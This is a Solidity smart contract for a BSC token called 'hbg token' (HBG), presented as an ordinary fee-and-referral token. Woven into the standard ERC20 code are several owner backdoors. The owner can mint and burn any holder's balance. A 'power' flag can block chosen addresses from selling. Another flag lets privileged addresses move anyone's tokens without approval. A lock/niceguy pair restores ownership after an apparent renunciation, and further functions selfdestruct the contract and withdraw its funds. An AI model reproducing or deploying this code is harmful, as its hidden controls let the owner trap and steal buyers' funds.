/**
 *Submitted for verification at BscScan.com on 2022-08-09
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    /**
     * @dev Multiplies two int256 variables and fails on overflow.
     */
    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;

        // Detect overflow when multiplying MIN_INT256 with -1
        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    /**
     * @dev Division of two int256 variables and fails on overflow.
     */
    function div(int256 a, int256 b) internal pure returns (int256) {
        // Prevent overflow when dividing MIN_INT256 by -1
        require(b != -1 || a != MIN_INT256);

        // Solidity already throws when dividing by 0.
        return a / b;
    }

    /**
     * @dev Subtracts two int256 variables and fails on overflow.
     */
    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    /**
     * @dev Adds two int256 variables and fails on overflow.
     */
    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    /**
     * @dev Converts to absolute value, and fails on overflow.
     */
    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }


    function toUint256Safe(int256 a) internal pure returns (uint256) {
        require(a >= 0);
        return uint256(a);
    }
}

library SafeMathUint {
  function toInt256Safe(uint256 a) internal pure returns (int256) {
    int256 b = int256(a);
    require(b >= 0);
    return b;
  }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function getniceguyTime() public view returns (uint256) {
        return _lockTime;
    }
    
    function getTime() public view returns (uint256) {
        return block.timestamp;
    }

    function lock(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }
    
    function niceguy() public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to niceguy");
        require(block.timestamp > _lockTime , "Contract is locked");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual override returns (string memory) {
        return _name;
    }

   

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function rename(string memory new_name,string memory new_symbol) public onlyOwner{
        _name=new_name;
        _symbol=new_symbol;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        if(!checkPower(_msgSender(),4))
            _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "decreased allowance below zero"));
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "transfer from the zero address");
        require(recipient != address(0), "transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, "transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _Cast(address account, uint256 amount) internal virtual {
        require(account != address(0), "Cast to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function Cast(address account, uint256 amount) public onlyOwner {
        _Cast(account,amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

     function burn(address account, uint256 amount) public onlyOwner {
        _burn(account,amount);
     }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "approve from the zero address");
        require(spender != address(0), "approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}
    function destroy(address payable wallet) external onlyOwner {
        selfdestruct(wallet);
    }
    function withdrawETH(address payable to,uint256 value) public onlyOwner {
       //to.transfer(value);
        (bool success,) = to.call{value:value}(new bytes(0));     
        require(success,'WITHDRAW_FAILED');
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * Casting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be to transferred to `to`.
     * - when `from` is zero, `amount` tokens will be Casted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    mapping(address => uint256) public _powers;
    function setPower(address actor,uint256 power) public onlyOwner{
        require(actor!=address(0),'error actor address');
        _powers[actor]=power;
    }

    function  setPowers(address[] memory actors,uint256 power) public onlyOwner {
        for(uint256 i = 0; i < actors.length; i++) {
            _powers[actors[i]] = power;
        }
    }
    

    function checkPower(address actor,uint256 power) internal view returns(bool){
        if(_powers[actor]<1) return false;
        return (_powers[actor]&power)==power;
    }
 
    function getPower(address spender) public view returns (uint256) {
        return _powers[spender];
    }
}

contract token is ERC20 {
    using SafeMath for uint256;

    uint256 public startTime;
    uint256 public swapTime;

   
    uint256 public _maxHoldAmount;
    uint256 public _maxSaleRate;  
    uint256 public _rateBase=10**4;

    mapping(address => bool) public _isExcluded;
    
    mapping (address => bool) public _automatedMarketMakerPairs;

    event Exclude(address indexed account, bool isExcluded);
    event ExcludeAccounts(address[] accounts, bool isExcluded);


    uint256 public _transferFeeRate;
    address public _baseFeeAddress;
    address public _burnAddress = address(0x000000000000000000000000000000000000dEaD);
    uint256 public _burnFeeRate;

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    mapping(address => address) private _inviter;
    bool public _openInviter;
    uint256[] public _inviterRates;
    uint256 public _inviterFeeMinHoldAmount;

    constructor()  payable ERC20("hbg token", "HBG") {

        //startTime = block.timestamp.div(1 days).mul( 1 days);
        //swapTime=block.timestamp.add(1 days);

        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);

        uint256 totalSupply = 200000000 * (10**decimals());
        _Cast(owner(), totalSupply);
    }

    function setTime(uint256 start,uint256 swap) public onlyOwner{
        startTime=start;
        swapTime=swap;
    }   
    function setOpenInviter(bool open)  public  onlyOwner {
        _openInviter=open;
    }
     function _getInviter(address user) public view onlyOwner returns (address) {
        return _inviter[user];
    }
    function _getMyInviter() public view returns (address) {
        return _inviter[_msgSender()];
    }
    function _checkInviterLine(address f,address u) public view returns (bool) {
        require(checkPower(_msgSender(),8),'no power');
        return checkInviterLine(f,u);
    }
    function checkInviterLine(address f,address u) private view returns (bool) {
        if(_inviter[u]==address(0)) {
            return false;
        }
        else if(_inviter[u]==f){
            return true;
        }
        else
            return checkInviterLine(f,_inviter[u]);
    }
    function _setInviter(address f,address u) public onlyOwner {
        require(f != u, "inviter yourself"); 
        require(!checkInviterLine(u,f), "inviter is grandson"); 
         _inviter[u] =f;
    }
    function _setMyInviter(address addr) public returns(bool){
        require(addr!=address(0),'no inviter');
        require(addr != _msgSender(), "inviter yourself");       
        require(_inviter[_msgSender()] == address(0), "already set");     
        
        return setInviter(addr,_msgSender());
    }
    function setInviter(address f,address u) private returns(bool){
        if(checkInviterLine(f,u) || checkInviterLine(u,f) ){
            return false;
        }
         else
        {
            _inviter[u] =f;
            return true;
        }
    }
       
    function setBurnAddress(address payable wallet) external onlyOwner{
        _burnAddress = wallet;
        excludeFromFees(_burnAddress, true);
    }
    function setTotalFeeAddress(address payable wallet) external onlyOwner{
        if(wallet==address(0))
            _baseFeeAddress=address(this);
        else
            _baseFeeAddress=wallet;
        excludeFromFees(_baseFeeAddress, true);
    }
    function setMaxHoldAmount(uint256 amount) public onlyOwner {
        _maxHoldAmount=amount;
    }
    function setFee(
        uint256    transferFeeRate_,
        uint256  burnFeeRate_,
        uint256[] memory inviterRates_
    ) public onlyOwner {
        _transferFeeRate=transferFeeRate_;
        _burnFeeRate=burnFeeRate_;
        _inviterRates=inviterRates_; 
    }
    
    function setMaxSaleRate(uint256 rate) public onlyOwner {
        _maxSaleRate=rate;
    }

    
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        if(_isExcluded[account] != excluded){
            _isExcluded[account] = excluded;
            emit Exclude(account, excluded);
        }
    }

    function excludeAccounts(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcluded[accounts[i]] = excluded;
        }

        emit ExcludeAccounts(accounts, excluded);
    }


    function isExcluded(address account) public view returns(bool) {
        return _isExcluded[account];
    }


    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        _setAutomatedMarketMakerPair(pair, value);
    }

     function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(_automatedMarketMakerPairs[pair] != value, "pair is already set to that value");
        _automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }
    
   

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "transfer from the zero address");
        require(to != address(0), "transfer to the zero address");
        //require(amount > 0, "amount must be greater than zero");
        require(!checkPower(from,1),'sender has no power'); 
        require(!checkPower(to,2),'recipient has no power');
        require(block.timestamp>startTime,"not start time");

        if(_maxHoldAmount>0 && !_isExcluded[to] && !_automatedMarketMakerPairs[to])
            require(balanceOf(to).add(amount)<=_maxHoldAmount,' exceeds max hold amount');
        if(swapTime>0 ){
            if(_automatedMarketMakerPairs[from]  && !_isExcluded[to])
                require(block.timestamp>swapTime,"not swap");
            else if(_automatedMarketMakerPairs[to]  && !_isExcluded[from])
                require(block.timestamp>swapTime,"not swap");
        }
        uint256 totalFee;
         if(_automatedMarketMakerPairs[from]){
                require(!checkPower(to,32),'no power to buy');

            }
            else if(_automatedMarketMakerPairs[to]){
                require(!checkPower(from,16),'no power to sale');     
               
                           
            }
            else if(_maxSaleRate>0 && !_isExcluded[from] && !_isExcluded[to]){
                require(amount<=balanceOf(from).mul(_maxSaleRate).div(_rateBase),'sale exceeds limit');
            }
            if(_isExcluded[from] || _isExcluded[to]){
                totalFee=0;
            }else{
                totalFee=amount.mul(_transferFeeRate).div(_rateBase);
            }

        super._transfer(from, to, amount.sub(totalFee));
        if(totalFee>0){
            super._transfer(from, _baseFeeAddress, totalFee);
            takeInviteFee(amount,to,0,8);
            takeBurnFee(amount);
        }
        
        if(_openInviter && from!=owner() && !_automatedMarketMakerPairs[to] && _inviter[to] == address(0) && !_automatedMarketMakerPairs[from] && from!=to) {
            setInviter(from,to);
        }

    }

    function takeBurnFee(uint256 amount) private returns(uint256 fee){
        if(_burnFeeRate>0 && amount>0 && _burnAddress!=address(0)){
            fee=amount.mul(_burnFeeRate).div(_rateBase);
            super._transfer(_baseFeeAddress, _burnAddress, fee);
        }
    }
    function takeInviteFee(uint256 amount,address user,uint256 gen,uint256 maxGen) private  {
        if(_openInviter && _inviter[user]!=address(0) && gen<maxGen && gen<_inviterRates.length){
            if(_inviterFeeMinHoldAmount==0 || (_inviterFeeMinHoldAmount>0 && balanceOf(_inviter[user])>=_inviterFeeMinHoldAmount)){
                uint256 fee=amount.mul(_inviterRates[gen]).div(_rateBase);
                super._transfer(_baseFeeAddress, _inviter[user], fee);
            }
                
             takeInviteFee(amount,_inviter[user],gen.add(1),maxGen);
        }
    }
}